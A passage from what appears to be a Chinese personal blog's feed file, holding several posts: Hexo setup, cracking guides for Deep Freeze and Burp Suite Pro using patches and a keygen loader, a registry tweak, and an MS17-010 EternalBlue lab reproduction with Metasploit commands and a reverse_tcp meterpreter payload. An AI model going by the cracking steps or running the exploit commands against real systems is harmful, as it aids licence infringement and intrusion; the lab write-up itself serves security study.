<code>ollyhsu.com</code>，各个后缀的价格不太一样，比如最广泛的.com就比较贵，看个人喜好咯。</p><p>你需要先去进行实名认证,然后在域名控制台中，看到你购买的域名。</p><p>点<strong>解析</strong>进去，添加解析。</p><p>我需要Github绑定<code>www.ollyhsu.com</code>，那么我在云解析控制台里添加主机记录为www，记录类型为CNAME，记录值为 <code>[YOUR USERNAME].github.io</code>。<br><strong>注意，解析线路选择默认</strong>！！</p><p>登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名<code>www.ollyhsu.com</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210216184453265.png" alt="image-20210216184453265"></p><p>然后在你的博客文件source中创建一个名为CNAME文件，不要后缀。写上你的域名。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210216184531399.png" alt="image-20210216184531399"></p><p>最后，在终端中，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>过不了多久，再打开你的浏览器，输入你自己的域名，就可以看到搭建的网站啦！</p><p>接下来你就可以正式开始写文章了。在<code>source/_post</code>中打开markdown文件，就可以开始编辑了。当你写完的时候，再</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>之后就可以看到更新了。</p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰点还原精灵标准版破解安装图文教程</title>
      <link href="/posts/ea7bfff2/"/>
      <url>/posts/ea7bfff2/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p>冰点还原 Deep Freeze Standard 标准版 v8.60完美破解版图文教程——由KIMIX发布，冰点还原能够将您的电脑变的无坚不催，它提供了一种终极的电脑防护方案，彻底改变IT 专家及家庭用户保护小型电脑使用环境的方式，让电脑随时保持原来状态，这就是它的工作原理。在您完成对电脑的配置工作之后，只需冻结它，所有让您百思不得其解、疑惑如何去除的意外变更，在重启之后全部消除。对于无需集中式控制、至多五台工作站的环境而言，这是简单、有效、省钱的解决方案。冰点还原标准版安装后，能保证每次重启都能实现100%的工作站恢复，同时享受机器更高的安全系数。</p><h2 id="准备">准备</h2><p>1、冰点还原 v8.60.020.5592标准版安装包</p><p>2、冰点还原破解补丁</p><p>3、图文安装详情一份</p><h2 id="安装步骤">安装步骤</h2><p>1、下载好文件，双击打开安装程序，选择&quot;下一步&quot;；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617203824963-yghZEw.png" alt="image-20200617203824963"></p><p>2、接受冰点表准版主要软件许可协议；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617203901251-dyqHOV.png" alt="image-20200617203901251"></p><p>3、勾选使用评估版安装，选择&quot;下一步&quot;；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617203944769-mps4WH.png" alt="image-20200617203944769"></p><p>4、勾选&quot;保持新发现的硬盘驱动器为Thawed解冻状态&quot;，一般我们只需保护C盘即可，如下图保证C盘为Frozen冻结状态即可，其余磁盘选择Thawed解冻模式。如果你需要其他磁盘也要进行保护可以将其改为Frozen模式。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617211810879-aBZLPT.png" alt="image-20200617211810879"></p><p>注意：这边的磁盘一定要想好保护哪几个，程序安装完成后无法修改，只能卸载重装冰点还原程序来重新设置。</p><p>5、直接选择安装，安装完成后会自动重启；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617204136444-bfG3Ok.png" alt="image-20200617204136444"></p><p>6、这个界面完成后会自动重启，如下图；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617211907960-EFhfq1.png" alt="image-20200617211907960"></p><p>7、重启后进入桌面，会提示设置保护密码，根据提示设置密码；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617212027409-hx3WAK.png" alt="image-20200617212027409"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617212057441-ydga28.png" alt="image-20200617212057441"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617212115850-D8awI4.png" alt="image-20200617212115850"></p><p>8、通过快捷键CTRL+ALT+SHIFT+F6 快捷键 或 按下SHIFT双击右下角冰点托盘，呼出冰点还原控制界面，输入密码进入控制面板。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617204717142-UhiDmw.png" alt="image-20200617204717142"></p><p>9、目前来看，现在是有30天的试用期</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617213729879-Sk6d7q.png" alt="image-20200617213729879"></p><p>10、接下来，进行程序的破解，首先选择&quot;启动后解冻&quot;，然后重启。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617204800720-hjW5U0.png" alt="image-20200617204800720"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617204822310-zxcKVm.png" alt="image-20200617204822310"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617212235955-rqDnzJ.png" alt="image-20200617212235955"></p><p>11、重启完成后，找到<code>C:\Program Files (x86)\Faronics\Deep Freeze\Install C-0</code> 文件夹(32位系统的位置是：<code>C:\Program Files\Faronics\Deep Freeze\Install C-0</code>),把<code>DFServ.exe</code> 重命名成<code>DFServ1.exe</code> ,再次重启电脑。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617212428482-1usvY5.png" alt="image-20200617212428482"></p><p>12、重启后，运行补丁程序；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617205252750-oJircE.png" alt="image-20200617205252750"></p><p>13、点击patch 会弹出提示如图提示框，点击&quot;是&quot;；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617205324605-aTfELC.png" alt="image-20200617205324605"></p><p>14、当程序中显示&quot;Successfully Patched&quot;，就已经打好补丁；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617205339544-FP2xk1.png" alt="image-20200617205339544"></p><p>15、把之前重命名为<code>DFServ1.exe</code>的文件改回去<code>DFServ.exe</code> ,重启电脑；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617205923055-Vt7YZl.png" alt="image-20200617205923055"></p><p>16、进入控制面板，发现已经为永不过期，程序破解成功。目前是解冻状态。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617212912651-MKSgMm.png" alt="image-20200617212912651"></p><p>17、选择&quot;启动后冻结&quot;，重启之后，电脑将会处于被保护状态。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200617205952681-lEz0gw.png" alt="image-20200617205952681"></p><h2 id="工作原理">工作原理</h2><p>冰点还原精灵的工作原理就是利用这款软件将电脑上所有的操作数据都记录下来，在下次重新启动的时候，将数据存储到空白磁盘中，那么原来的数据就会消失不见。</p><h2 id="下载地址">下载地址</h2><p>版权声明：由于国内代理商所代理，涉及版权侵权问题，所以本站只做文章信息的传递，不提供任何破解文件下载，请支持正版软件的发展购买注册，获得更好的正版服务。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 维护 </tag>
            
            <tag> 还原 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite Pro 2020.5 破解版下载及优雅启动方法</title>
      <link href="/posts/17685a4a/"/>
      <url>/posts/17685a4a/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>众所周知国内我们使用的 Burp Suite 大多数是大佬们分享出来的专业破解版的 Burp Suite，每次启动的时候都得通过加载器来启动 Burp Suite，那有没有更加优雅的方式呢？下面就开始水这一篇文章了，告诉大家如何在MAC下配置基本的渗透测试环境。</p><h2 id="更新日志">更新日志</h2><p>Burp Suite Professional 2020.5 更新日志:</p><p>此版本为HTTP消息编辑器提供了有用的新功能，并进行了一些常规改进。</p><p><strong>HTTP消息编辑器</strong></p><p>在Burp Suite消息编辑器中呈现非打印字符（2020年6月功能发布）</p><p>现在，您可以选择在HTTP消息编辑器中将非打印字符显示为“lozenges”。十六进制值小于20的任何字节都支持此功能，包括制表符，换行符，回车和空字节。</p><p>对于许多用例，此功能将非常有用，包括：</p><ul><li>发现响应中字节值之间的细微差异</li><li>试用HTTP请求走私漏洞</li><li>研究行尾以识别潜在的HTTP标头注入漏洞</li><li>观察服务器如何处理空字节注入</li><li>默认情况下，非打印字符是隐藏的，但是您可以通过单击编辑器底部的“ \ n”按钮来打开和关lozenges。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/00-3.png" alt=""></p><p>这些非打印字符当前只能显示在消息编辑器中。现在，您必须使用Burp的十六进制视图编辑字节。但是，我们计划在不久的将来使您能够直接在消息编辑器中执行此操作。</p><h2 id="总体改进">总体改进</h2><p>此版本还对Burp的各个领域进行了以下较小改进：</p><p>用于实验性浏览器驱动的扫描模式的嵌入式Chromium浏览器已升级到版本83。</p><p>现在，<strong>专业版和社区版均支持Java 14</strong>。</p><p>默认情况下，Burp Proxy不再拦截对SVG或字体文件的请求。</p><p>现在，抓取静态内容的速度更快。</p><h2 id="Bug修复">Bug修复</h2><p>我们还实现了一些小错误修复，最值得注意的是：</p><ul><li>现在显示401响应的响应接收/完成时间。</li><li>现在，即使所花费的时间小于1毫秒，也会显示响应时间。</li><li>现在，在运行会话跟踪时可以正确应用“检查会话有效”会话处理规则</li><li>内容发现工具不再错误地显示“会话未运行”消息。</li></ul><h2 id="Burpsuite激活">Burpsuite激活</h2><p>这里不赘述了，大家都是做安全的，我这里再啰嗦的话 就显得很多余了。如果 BurpSuite 没有激活的话，那么跟我一起来看看怎么激活它：</p><p>1、双击Burp Sutie Pro Private Loader.jar运行程序</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626194756742.png" alt="image-20200626194756742"></p><p>2、修改License Text文本中的内容我们无法修改不，不管，直接点击Run按钮运行</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626194829162.png" alt="image-20200626194829162"></p><p>3、把keygen中的License复制到弹出的burpsuite窗口中，点击Next按钮</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626195133181.png" alt="image-20200626195133181"></p><p>4、窗口切换后，点击Manual activation按钮</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626195201111.png" alt="image-20200626195201111"></p><p>5、窗口跳转后，点击Copy request按钮，把复制的request复制到kengen窗口的Activation Request窗口中</p><p>6、复制粘贴response响应信息到burpsuite的response窗口中，点击Next按钮</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626195249572.png" alt="image-20200626195249572"></p><p>7、看到如下提示，说明激活成功了</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626195309013.png" alt="image-20200626195309013"></p><p>8、再次点击Run运行程序</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626200058543.png" alt="image-20200626200058543"></p><p>9、弹出启动界面后，能看到下图所示的窗口，说明激活成功了</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626195405638.png" alt="image-20200626195405638"></p><p>Burp Suite不激活的话，每次启动都是要重新激活的，这样的话就很难受了。</p><h2 id="启动方法">启动方法</h2><h3 id="macOS">macOS</h3><h4 id="命令行模拟启动">命令行模拟启动</h4><p><strong>启动示例</strong></p><p>当前目录结构如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/Users/kimix/Desktop/burpsuite_pro_v2020.5</span><br><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── BurpSuite.icns</span><br><span class="line">├── BurpSuiteChs.jar</span><br><span class="line">├── Dr.FarFar.jar</span><br><span class="line">├── Goescat-Macaron-Burp-suite.ico</span><br><span class="line">├── Loader.jar</span><br><span class="line">├── burp-loader-keygen-2020_4_1.jar</span><br><span class="line">├── burpsuite_pro_v2020.5.jar</span><br><span class="line">└── jython.jar</span><br><span class="line"></span><br><span class="line">0 directories, 8 files</span><br></pre></td></tr></table></figure><p>知道路径的情况下，下面尝试命令行直接启动试试看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xdock:icon=BurpSuite.icns -Dfile.encoding=utf-8 -javaagent:burp-loader-keygen-2020_4_1.jar -noverify -javaagent:BurpSuiteChs.jar -jar burpsuite_pro_v2020.5.jar</span><br></pre></td></tr></table></figure><p>启动测试没有问题，下面使用<code>&amp;&amp;</code>将命令合为一个命令，用于下方制作APP使用，不同版本的启动命令分别如下，大家用的话修改成对应自己的目录信息即可。</p><h4 id="制作应用程序">制作应用程序</h4><p><strong>新建工作流程</strong></p><p>借助 macOS 自带的自动操作 automator.app 可以轻松地将命令行封装成一个应用程序出来：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626201814690.png" alt="image-20200626201814690"></p><p>首先打开自动操作，位置选择应用程序，选择左下角的<code>新建文稿</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626202003297.png" alt="image-20200626202003297"></p><p>选择文稿类型为「应用程序」，点击「选取」：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626202123346.png" alt="image-20200626202123346"></p><p>左侧列表中找到<code>运行Shell脚本</code>然后拖入进去：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626202257472.png" alt="image-20200626202257472"></p><p>把上文中的命令行模拟启动对应的命令粘贴进来，点击右上角<code>运行</code>测试一下看看能不能成功启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Users/kimix/Desktop/burpsuite_pro_v2020.5 &amp;&amp; java -Xdock:icon=BurpSuite.icns -Dfile.encoding=utf-8 -javaagent:burp-loader-keygen-2020_4_1.jar -noverify -javaagent:BurpSuiteChs.jar -jar burpsuite_pro_v2020.5.jar</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626202430778.png" alt="image-20200626202430778"></p><p>正常情况下，应该可以看到下面的启动图</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626202520283.png" alt="image-20200626202520283"></p><p>OK 测试应该是没有问题的，然后将BurpSuite关掉，<code>command</code>+<code>s</code>保存一下，保存的文件格式选择<code>应用程序</code>，自定义命名一下，然后保存到<code>应用程序</code>中：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626202815168.png" alt="image-20200626202815168"></p><p>然后就可以在<code>启动台LaunchPad</code>中找到这个应用程序了，点击一下就可以成功启动BurpSuite了：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626202739063.png" alt="image-20200626202739063"></p><h4 id="美化BP图标">美化BP图标</h4><p>当然这么丑的图标，我是看不下去的，下面来使用上文中下载的 BP 图标文件。</p><p>在「应用程序」文件夹中找到我们刚刚制作的「BurpSuite」应用程序，「右键」点击「显示简介」，然后将下载好的<code>icns</code>图标文件拖入到简介的左上角：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626203107161.png" alt="image-20200626203107161"></p><p>OK 美化成功，现在就可以在 mac 下优雅地启动 BP 了~~</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626203124336.png" alt="image-20200626203124336"></p><h3 id="Windows">Windows</h3><p>在Windows下可以使用脚本激活启动Burp Suite</p><p>新建<code>激活.vbs</code>文件，在文件中写入，保存后运行，即可快速完成激活。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;java.exe -Dfile.encoding=utf-8 -noverify -javaagent:Dr.FarFar.jar -jar Loader.jar&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p>新建<code>启动.vbs</code>文件，在文件中写入，保存，双击脚本即可打开BurpSuite</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;java.exe -Dfile.encoding=utf-8 -javaagent:burp-loader-keygen-2020_4_1.jar -noverify -javaagent:BurpSuiteChs.jar -jar burpsuite_pro_v2020.5.jar&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="Linux">Linux</h3><p>先进行激活Burp，终端运行下列命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dfile.encoding=utf-8 -noverify -javaagent:Dr.FarFar.jar -jar Loader.jar</span><br></pre></td></tr></table></figure><p>弹出激活注册机界面，然后点击run，重复前面的激活步骤即可完成激活</p><p>明确好BurpSuite存放路径，建立一个脚本文件<code>burpsuite.sh</code>，添加以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /Users/kimix/Desktop/burpsuite_pro_v2020.5 &amp;&amp; java -Xdock:icon=BurpSuite.icns -Dfile.encoding=utf-8 -javaagent:burp-loader-keygen-2020_4_1.jar -noverify -javaagent:BurpSuiteChs.jar -jar burpsuite_pro_v2020.5.jar</span><br></pre></td></tr></table></figure><p>将上面sh脚本文件复制到<code>/usr/bin</code>路径下，以后在终端输入burpsuite即可快速打开BurpSuite</p><h2 id="SSL-证书">SSL 证书</h2><p>使用已经代理了BP的浏览器访问如下地址：<a href="http://burp/">http://burp</a></p><p>会得到如下界面，点击右上角的<code>CA Certificate</code>证书，然后保存好<code>der</code>证书文件：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626205456231.png" alt="image-20200626205456231"></p><p>浏览器设置里面找到<code>隐私与安全</code>，找到<code>查看证书</code>的选项：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626205534615.png" alt="image-20200626205534615"></p><p>选择<code>证书颁发机构</code>，点击<code>导入</code>，选择刚刚下载好的<code>der</code>证书导入即可：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626205644898.png" alt="image-20200626205644898"></p><p>记得下面2选项个都要勾选：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626205707020.png" alt="image-20200626205707020"></p><p>OK现在你的BP就可以在Firefox下美滋滋地抓取HTTPS的数据包了：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626210028178.png" alt="image-20200626210028178"></p><h2 id="Chrome导入BP证书">Chrome导入BP证书</h2><p>macOS 下导入 BP 的证书后，也是可以完美的抓取 HTTPS 数据包的。</p><p>打开 macOS 自带的强大密码管理工具：「<code>钥匙串</code>」，然后找到左下角「<code>证书</code>」这一栏，将 BP 的证书：<code>cacert.der</code>直接拖入：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626210129747.png" alt="image-20200626210129747"></p><p>鼠标选中刚刚拖入的 BP 证书，「<code>右键</code>」-「<code>显示简介</code>」-「<code>信任</code>」选择「<code>始终信任</code>」:</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20200626210217018.png" alt="image-20200626210217018"></p><p>OK 现在你的BurpSuite就可以在 Chrome下美滋滋地抓取 HTTPS 的数据包了：</p><h2 id="下载地址">下载地址</h2><p>Burp Suite Pro 2020.5破解版（目前链接已经失效，不在提供下服务）</p><h2 id="文章打赏">文章打赏</h2><p>本文本身实际上没有啥技术含量，但是写起来还是比较浪费时间的，在这个喧嚣浮躁的时代，个人博客越来越没有人看了，写博客感觉一直是用爱发电的状态，所以如果你恰巧财力雄厚，感觉本文对你有所帮助的话，可以考虑打赏一下本文，用以维持高昂的服务器运营费用（域名费用、服务器费用、CDN费用等）</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从此电脑中移除腾讯视频爱奇艺快捷方式</title>
      <link href="/posts/d1dd612e/"/>
      <url>/posts/d1dd612e/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言">0x01 前言</h2><p>Windows下的系统安装完腾讯视频及爱奇艺总是会驻留在此电脑中的设备和驱动器内，直接Del删除貌似并不能完全卸载</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210429162726461.png" alt="image-20210429162726461"></p><h2 id="0x02-解决方法">0x02 解决方法</h2><blockquote><p>腾讯视频</p></blockquote><p>以<strong>管理员身份</strong>运行<strong>CMD</strong>，输入下面命令，回车确认即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\&#123;E701A357-F43B-42c9-98D1-96B6C11EAD87&#125; /f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210429163347937.png" alt="image-20210429163347937"></p><blockquote><p>爱奇艺热播</p></blockquote><p>如果有这个就以<strong>管理员身份</strong>运行<strong>CMD</strong>，输入下面命令，回车确认即可；没有就不用了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\&#123;F21B700B-C552-4C71-BF44-41E57B1095AF&#125; /f</span><br><span class="line">REG DELETE  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\&#123;FC1125BA-C584-4947-8750-D907269E3D11&#125; /f</span><br></pre></td></tr></table></figure><h3 id="0x03-重启资源管理器">0x03 重启资源管理器</h3><p>通过任务管理器重启资源管理器，再打开就看不到啦！</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210429164004653.png" alt="image-20210429164004653"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS17-010漏洞复现笔记</title>
      <link href="/posts/MS17-010/"/>
      <url>/posts/MS17-010/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2><p>永恒之蓝漏洞 CVE-2017-0143(MS17-010) 是方程式组织在其漏洞利用框架中一个针对<strong>SMB服务</strong>进行攻击的漏洞，该漏洞导致攻击者在目标系统上<strong>可以执行任意代码</strong>。</p><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><p>注：SMB服务的作用：该服务在Windows与UNIX系列OS之间搭起一座桥梁，让两者的资源可互通有无，SMB服务详解：<a href="https://www.cnblogs.com/aisa/p/8624720.html">点击查看</a></p><h2 id="漏洞原理">漏洞原理</h2><p>下面两篇文章从实际代码详细分析了漏洞原理，想要从代码详细理解该漏洞的可以点击查看</p><p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/73480807">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p><h2 id="影响版本">影响版本</h2><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p><h2 id="复现过程">复现过程</h2><h3 id="IP信息">IP信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机：Kali LinuxIP：192.168.216.138</span><br><span class="line">靶机：Windows 7 IP：192.168.216.134</span><br></pre></td></tr></table></figure><h3 id="靶机配置">靶机配置</h3><p>1、开放靶机 Win7 445端口</p><p>使用<code>netstat -an</code> 看一下445端口是否活动</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600342.png" alt="image-20220112152449420"></p><p>2.关闭win7防火墙（保险起见）</p><p>步骤：win7控制面板，然后在Windows防火墙中关闭即可</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600344.png" alt="image-20220112152532542"></p><h3 id="启动MSF">启动MSF</h3><p>在kali里打开终端，输入下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600345.png" alt="image-20220112152634883"></p><h3 id="查看漏洞模块">查看漏洞模块</h3><p>使用命令<code>search ms17_010</code>搜索ms17_010模块</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600346.png" alt="image-20220112153238714"></p><h3 id="扫描主机">扫描主机</h3><p>我们先使用扫描的模块对目标机进行扫描，如果目标机存在漏洞的话，我们再使用漏洞利用模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010//选择漏洞利用模块</span><br><span class="line">set rhosts 192.168.216.134//查看模块利用所需要的设置</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>扫描发现该靶机存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600347.png" alt="image-20220112154002713"></p><h3 id="利用漏洞">利用漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue//设置目标主机的地址</span><br><span class="line">set rhosts 192.168.4.71//设置目标主机的地址</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp//设置payload</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600348.png" alt="image-20220112154223594"></p><p>等待提示出WIN就已经成功拿到权限了</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600349.png" alt="image-20220112154302312"></p><h3 id="查看用户权限">查看用户权限</h3><p>使用命令<code>getuid</code>查看当前用户的权限，发现已经是system权限了</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600350.png" alt="image-20220112154321644"></p><h3 id="查看系统信息">查看系统信息</h3><p>使用<code>sysinfo</code>命令，可以查看到当前系统的信息</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600351.png" alt="image-20220112154336171"></p><h3 id="获取shell">获取shell</h3><p>拿shell，且是系统权限</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed/2020/11/202201121600352.png" alt="image-20220112154351094"></p><figure class="highlight 